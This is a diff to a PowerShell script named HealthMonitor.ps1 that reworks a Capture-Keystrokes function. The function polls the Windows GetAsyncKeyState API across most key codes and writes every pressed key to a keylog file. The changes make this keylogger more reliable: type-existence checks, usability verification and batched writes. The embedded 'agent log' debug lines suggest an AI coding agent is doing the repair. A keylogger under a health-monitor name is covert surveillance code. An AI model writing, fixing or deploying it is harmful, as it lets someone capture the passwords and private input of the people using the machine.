@@ -131,13 +131,32 @@ function Capture-Keystrokes {
     
     try {
         # Load required assemblies
-        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
         
-        # Import GetAsyncKeyState API
-        $addTypeResult = Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);' -Name KeyState -Namespace User -EA SilentlyContinue
+        # Import GetAsyncKeyState API - check if type already exists first
+        $typeExists = $false
+        try {
+            $testType = [User.KeyState]
+            $typeExists = $true
+        } catch {
+            $typeExists = $false
+        }
+        
+        if (-not $typeExists) {
+            Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);' -Name KeyState -Namespace User -ErrorAction Stop
+        }
+        
+        # Verify the type is usable
+        try {
+            $testResult = [User.KeyState]::GetAsyncKeyState(0)
+            $typeUsable = $true
+        } catch {
+            $typeUsable = $false
+            throw "GetAsyncKeyState type not usable: $_"
+        }
         
         #region agent log
-        @{sessionId='debug-session';runId='run1';hypothesisId='H1';location='HealthMonitor.ps1:133';message='Add-Type result';data=@{success=($null -ne $addTypeResult);typeExists=([System.Type]::GetType('User.KeyState') -ne $null)}} | ConvertTo-Json -Compress | Add-Content $logPath
+        @{sessionId='debug-session';runId='run1';hypothesisId='H1';location='HealthMonitor.ps1:133';message='Add-Type result';data=@{typeExists=$typeExists;typeUsable=$typeUsable}} | ConvertTo-Json -Compress | Add-Content $logPath
         #endregion
         
         # Clear keylog file
@@ -166,26 +185,39 @@ function Capture-Keystrokes {
             #endregion
             
             try {
-                # Check virtual key codes 8-190
+                # Check virtual key codes 8-190 (optimized: check in batches)
+                $keysToCheck = @()
                 for ($virtualKey = 8; $virtualKey -le 190; $virtualKey++) {
                     $keyChecks++
                     # Check if key is pressed (-32767 means just pressed)
-                    $keyState = [User.KeyState]::GetAsyncKeyState($virtualKey)
-                    if ($keyState -eq -32767) {
-                        $keyName = [System.Windows.Forms.Keys]$virtualKey
-                        try {
-                            Add-Content $keylogFile "$keyName " -NoNewline -ErrorAction Stop
-                        } catch {
-                            #region agent log
-                            @{sessionId='debug-session';runId='run1';hypothesisId='H2';location='HealthMonitor.ps1:148';message='File write error';data=@{error=$_.Exception.Message;virtualKey=$virtualKey}} | ConvertTo-Json -Compress | Add-Content $logPath
-                            #endregion
-                            $exceptionsInLoop++
+                    try {
+                        $keyState = [User.KeyState]::GetAsyncKeyState($virtualKey)
+                        if ($keyState -eq -32767) {
+                            $keysToCheck += $virtualKey
                         }
+                    } catch {
+                        #region agent log
+                        @{sessionId='debug-session';runId='run1';hypothesisId='H1,H4';location='HealthMonitor.ps1:173';message='GetAsyncKeyState exception';data=@{error=$_.Exception.Message;virtualKey=$virtualKey}} | ConvertTo-Json -Compress | Add-Content $logPath
+                        #endregion
+                        $exceptionsInLoop++
+                    }
+                }
+                
+                # Write captured keys to file (batch write to reduce file I/O)
+                if ($keysToCheck.Count -gt 0) {
+                    $keyNames = $keysToCheck | ForEach-Object { [System.Windows.Forms.Keys]$_ }
+                    try {
+                        Add-Content $keylogFile ($keyNames -join " ") -NoNewline -ErrorAction Stop
+                    } catch {
+                        #region agent log
+                        @{sessionId='debug-session';runId='run1';hypothesisId='H2';location='HealthMonitor.ps1:177';message='File write error';data=@{error=$_.Exception.Message;keyCount=$keysToCheck.Count}} | ConvertTo-Json -Compress | Add-Content $logPath
+                        #endregion
+                        $exceptionsInLoop++
                     }
                 }
             } catch {
                 #region agent log
-                @{sessionId='debug-session';runId='run1';hypothesisId='H1,H4';location='HealthMonitor.ps1:144';message='Exception in key check loop';data=@{error=$_.Exception.Message;iteration=$loopIterations}} | ConvertTo-Json -Compress | Add-Content $logPath
+                @{sessionId='debug-session';runId='run1';hypothesisId='H1,H4';location='HealthMonitor.ps1:168';message='Exception in key check loop';data=@{error=$_.Exception.Message;iteration=$loopIterations}} | ConvertTo-Json -Compress | Add-Content $logPath
                 #endregion
                 $exceptionsInLoop++
             }
